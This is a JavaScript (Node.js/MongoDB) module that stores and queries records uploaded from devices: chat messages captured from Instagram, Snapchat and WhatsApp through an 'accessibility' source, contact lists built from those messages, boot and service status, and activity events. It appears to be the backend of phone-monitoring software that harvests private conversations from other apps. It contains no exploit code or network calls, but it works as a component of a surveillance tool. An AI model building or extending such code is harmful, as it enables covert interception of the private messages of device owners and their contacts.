'use strict';

const DeviceMeta = require('../models/DeviceMeta');
const ChatMessage = require('../models/ChatMessage');
const BootStatus = require('../models/BootStatus');
const ActivityEvent = require('../models/ActivityEvent');

async function upsertDevice(deviceId, data) {
    const id = String(deviceId || '').trim().toUpperCase();
    if (!id) return null;
    return DeviceMeta.findOneAndUpdate(
        { deviceId: id },
        { $set: { ...data, deviceId: id, updatedAt: new Date() } },
        { upsert: true, new: true }
    ).lean();
}

async function saveChatMessages(deviceId, appKey, list) {
    const id = String(deviceId || '').trim().toUpperCase();
    if (!id || !Array.isArray(list) || !list.length) return 0;
    let n = 0;
    for (const msg of list) {
        try {
            const conversation = String(msg.conversation || msg.contact || msg.contactName || msg.sender || '').trim();
            const text = String(msg.text || msg.message || '').trim();
            if (!conversation || !text) continue;
            // Prefer stable eventId from device so retries don't create duplicates
            const msgKey = msg.msgKey
                || (msg.eventId ? `${appKey}|${msg.eventId}` : null)
                || `${appKey}|${conversation}|${msg.timestamp || Date.now()}|${text.slice(0, 40)}`;
            const direction = String(msg.direction || 'IN').toUpperCase();
            const dir = (direction === 'OUT' || direction === 'OUTGOING' || direction === 'SENT') ? 'OUT' : 'IN';
            const packageName = msg.packageName
                || (appKey === 'instagram' ? 'com.instagram.android'
                    : appKey === 'snapchat' ? 'com.snapchat.android'
                    : appKey === 'whatsapp' ? 'com.whatsapp' : '');
            await ChatMessage.updateOne(
                { deviceId: id, app: appKey, msgKey },
                {
                    $setOnInsert: {
                        deviceId: id,
                        app: appKey,
                        packageName,
                        conversation,
                        conversationId: conversation,
                        contactName: conversation,
                        contact: conversation,
                        sender: msg.sender || (dir === 'OUT' ? 'You' : conversation),
                        text,
                        message: text,
                        direction: dir,
                        status: dir === 'OUT' ? 'sent' : 'received',
                        messageType: msg.type || msg.messageType || 'TEXT',
                        type: msg.type || 'TEXT',
                        source: msg.source || 'accessibility',
                        timestamp: Number(msg.timestamp) || Date.now(),
                        clientTimestamp: Number(msg.clientTimestamp) || 0,
                        serverTimestamp: Date.now(),
                        eventId: msg.eventId || '',
                        msgKey,
                        createdAt: new Date(),
                    },
                },
                { upsert: true }
            );
            n++;
        } catch (e) {
            // duplicate key etc.
            console.warn('[saveChatMessages]', appKey, e && e.message);
        }
    }
    return n;
}

async function loadChatMessages(deviceId, appKey, contact, limit) {
    const id = String(deviceId || '').trim().toUpperCase();
    const lim = Math.min(parseInt(limit, 10) || 200, 1000);
    const q = { deviceId: id };
    if (appKey && appKey !== 'all') q.app = appKey;
    if (contact && contact !== 'all') {
        q.$or = [{ conversation: contact }, { contact }, { contactName: contact }];
    }
    return ChatMessage.find(q).sort({ timestamp: -1 }).limit(lim).lean();
}

async function loadChatContacts(deviceId, appKey) {
    const id = String(deviceId || '').trim().toUpperCase();
    const match = { deviceId: id };
    if (appKey && appKey !== 'all') match.app = appKey;
    const rows = await ChatMessage.aggregate([
        { $match: match },
        { $addFields: {
            effectiveConversation: {
                $cond: [
                    { $ne: [{ $trim: { input: { $ifNull: ['$conversation', ''] } } }, ''] },
                    '$conversation',
                    { $cond: [
                        { $ne: [{ $trim: { input: { $ifNull: ['$contactName', ''] } } }, ''] },
                        '$contactName',
                        '$sender'
                    ] }
                ]
            }
        } },
        { $match: { effectiveConversation: { $nin: ['', null] } } },
        { $sort: { timestamp: -1, createdAt: -1 } },
        {
            $group: {
                _id: { app: '$app', conversation: '$effectiveConversation' },
                lastMessage: { $first: { $ifNull: ['$text', '$message'] } },
                timestamp: { $first: '$timestamp' },
                serverTimestamp: { $first: '$serverTimestamp' },
                count: { $sum: 1 },
            },
        },
        { $sort: { timestamp: -1, serverTimestamp: -1 } },
        { $limit: 200 },
    ]);
    return rows.map((r) => ({
        app: r._id.app,
        conversation: r._id.conversation,
        contact: r._id.conversation,
        lastMessage: r.lastMessage || '',
        timestamp: r.timestamp || r.serverTimestamp || 0,
        count: r.count,
    }));
}

async function saveBootStatus(deviceId, payload) {
    const id = String(deviceId || '').trim().toUpperCase();
    if (!id) return null;
    const eventKey = payload.eventKey || `${id}|${payload.bootSessionId}|${payload.eventType}|${payload.timestamp || Date.now()}`;
    try {
        return await BootStatus.findOneAndUpdate(
            { deviceId: id, eventKey },
            {
                $setOnInsert: {
                    deviceId: id,
                    bootSessionId: payload.bootSessionId || '',
                    eventType: payload.eventType || 'unknown',
                    serviceName: payload.serviceName || '',
                    status: payload.status || 'SUCCESS',
                    message: payload.message || '',
                    eventKey,
                    timestamp: payload.timestamp || Date.now(),
                },
            },
            { upsert: true, new: true }
        ).lean();
    } catch (e) {
        return null;
    }
}

async function loadAllBootEvents(deviceId, limit) {
    const id = String(deviceId || '').trim().toUpperCase();
    const lim = Math.min(parseInt(limit, 10) || 100, 500);
    return BootStatus.find({ deviceId: id }).sort({ timestamp: -1 }).limit(lim).lean();
}

async function loadLatestBootStatus(deviceId) {
    const id = String(deviceId || '').trim().toUpperCase();
    return BootStatus.findOne({ deviceId: id }).sort({ timestamp: -1 }).lean();
}

async function loadActivityEvents(deviceId, limit) {
    const id = String(deviceId || '').trim().toUpperCase();
    const lim = Math.min(parseInt(limit, 10) || 100, 500);
    return ActivityEvent.find({ deviceId: id }).sort({ timestamp: -1 }).limit(lim).lean();
}

async function clearActivityEvents(deviceId) {
    const id = String(deviceId || '').trim().toUpperCase();
    await ActivityEvent.deleteMany({ deviceId: id });
    return true;
}

module.exports = {
    upsertDevice,
    saveChatMessages,
    loadChatMessages,
    loadChatContacts,
    saveBootStatus,
    loadAllBootEvents,
    loadLatestBootStatus,
    loadActivityEvents,
    clearActivityEvents,
};
